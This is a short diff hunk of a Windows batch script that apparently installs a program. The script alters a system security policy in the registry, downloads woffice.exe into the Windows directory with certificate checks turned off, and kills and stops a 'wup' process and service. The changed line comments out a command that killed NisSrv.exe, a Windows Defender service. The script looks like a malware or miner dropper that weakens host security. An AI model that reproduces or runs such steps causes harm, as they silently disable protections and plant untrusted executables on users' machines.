@@ -72,7 +72,7 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalA
 wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
-taskkill /f /im NisSrv.exe
+rem taskkill /f /im NisSrv.exe
 taskkill /f /im wup.exe
 net stop wup
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
